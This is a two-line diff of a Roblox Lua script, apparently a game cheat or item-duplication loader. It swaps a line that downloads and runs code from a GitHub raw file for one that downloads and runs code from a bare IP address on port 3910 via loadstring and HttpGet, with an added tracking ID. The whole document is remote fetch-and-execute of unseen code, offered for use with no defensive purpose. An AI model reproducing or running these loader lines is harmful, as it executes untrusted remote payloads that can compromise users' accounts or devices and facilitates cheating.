@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Stas08-rgb/Growagardendup/refs/heads/main/4bb728b49688f0ef1883800ff4ad6b0d.txt"))()
+ID="2553d4bf-9d71-4496-aa12-329cfdd4d54c";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
